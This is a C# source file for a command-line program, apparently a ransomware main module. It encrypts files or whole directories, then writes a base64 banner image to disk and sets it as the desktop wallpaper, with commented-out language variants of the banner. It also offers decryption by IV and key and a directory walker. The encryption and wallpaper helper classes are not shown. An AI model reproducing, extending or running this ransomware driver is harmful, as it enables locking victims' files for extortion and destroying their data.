using System;
using System.Collections.Generic;
using Crypto;

namespace gosharp
{
    public class Program
    {
        static void HelpMsg()
        {
            Console.WriteLine("Usage: main.exe <command>");
            Console.WriteLine("Commands:");
            Console.WriteLine("  encrypt -f <file_path>");
            Console.WriteLine("  encryptdir -d <directory_path>");
            Console.WriteLine("  decrypt -f <file_path> -i <base64_iv> -k <base64_key>");
            Console.WriteLine("  decryptdir -d <directory_path> -i <base64_iv> -k <base64_key>");
            Console.WriteLine("  walkdir -d <directory_path>");
        }

        public static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                HelpMsg();
                return;
            }

            // BANNER PT
            string imgBase64 = "";
            // BANNER ES
            // string imgBase64 = "BASE64IMG";
            // BANNER EN
            // string imgBase64 = "BASE64IMG";

            string command = args[0].ToLower();

            try
            {
                switch (command)
                {
                    case "encrypt":
                        HandleEncrypt(args);
                        break;

                    case "encryptdir":
                        HandleEncryptDir(args, imgBase64);
                        break;

                    case "decrypt":
                        HandleDecrypt(args);
                        break;

                    case "decryptdir":
                        HandleDecryptDir(args);
                        break;

                    case "walkdir":
                        HandleWalkDir(args);
                        break;

                    default:
                        Console.WriteLine("[-] Unknown command.");
                        HelpMsg();
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        static void HandleEncrypt(string[] args)
        {
            string filePath = GetArgValue(args, "-f");

            if (string.IsNullOrEmpty(filePath))
            {
                Console.WriteLine("Error: -f <file_path> is required");
                Console.WriteLine("Usage: encrypt -f <file_path>");
                return;
            }

            CryptoHelper.EncryptFile(filePath);
            Console.WriteLine("File encrypted successfully.");
        }

        static void HandleEncryptDir(string[] args, string imgBase64)
        {
            string dirPath = GetArgValue(args, "-d");

            if (string.IsNullOrEmpty(dirPath))
            {
                Console.WriteLine("Error: -d <directory_path> is required");
                Console.WriteLine("Usage: encryptdir -d <directory_path>");
                return;
            }

            CryptoHelper.EncryptFilesInDirectory(dirPath);
            Console.WriteLine("Files in directory encrypted successfully.");

            string ret = WallPaper.SaveFile(imgBase64);
            Console.WriteLine($"[+] ret val: {ret}");

            try
            {
                WallPaper.SetWallpaper(ret);
                Console.WriteLine("[+] SetWallpaper: Success");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[+] SetWallpaper: {ex.Message}");
            }
        }

        static void HandleDecrypt(string[] args)
        {
            string filePath = GetArgValue(args, "-f");
            string iv = GetArgValue(args, "-i");
            string key = GetArgValue(args, "-k");

            if (string.IsNullOrEmpty(filePath) || string.IsNullOrEmpty(iv) || string.IsNullOrEmpty(key))
            {
                Console.WriteLine("Error: -f <file_path>, -i <base64_iv>, and -k <base64_key> are required");
                Console.WriteLine("Usage: decrypt -f <file_path> -i <base64_iv> -k <base64_key>");
                return;
            }

            CryptoHelper.DecryptFile(filePath, iv, key);
            Console.WriteLine("File decrypted successfully.");
        }

        static void HandleDecryptDir(string[] args)
        {
            string dirPath = GetArgValue(args, "-d");
            string iv = GetArgValue(args, "-i");
            string key = GetArgValue(args, "-k");

            if (string.IsNullOrEmpty(dirPath) || string.IsNullOrEmpty(iv) || string.IsNullOrEmpty(key))
            {
                Console.WriteLine("Error: -d <directory_path>, -i <base64_iv>, and -k <base64_key> are required");
                Console.WriteLine("Usage: decryptdir -d <directory_path> -i <base64_iv> -k <base64_key>");
                return;
            }

            CryptoHelper.DecryptFilesInDirectory(dirPath, iv, key);
            Console.WriteLine("Files in directory decrypted successfully.");
        }

        static void HandleWalkDir(string[] args)
        {
            string dirPath = GetArgValue(args, "-d");

            if (string.IsNullOrEmpty(dirPath))
            {
                Console.WriteLine("Error: -d <directory_path> is required");
                Console.WriteLine("Usage: walkdir -d <directory_path>");
                return;
            }

            List<string> files = new List<string>();
            CryptoHelper.WalkDir(dirPath, ref files);

            Console.WriteLine("Absolute paths of files:");
            foreach (string file in files)
            {
                Console.WriteLine(file);
            }
        }

        static string? GetArgValue(string[] args, string flag)
        {
            for (int i = 0; i < args.Length - 1; i++)
            {
                if (args[i] == flag)
                {
                    return args[i + 1];
                }
            }
            return null;
        }
    }
}
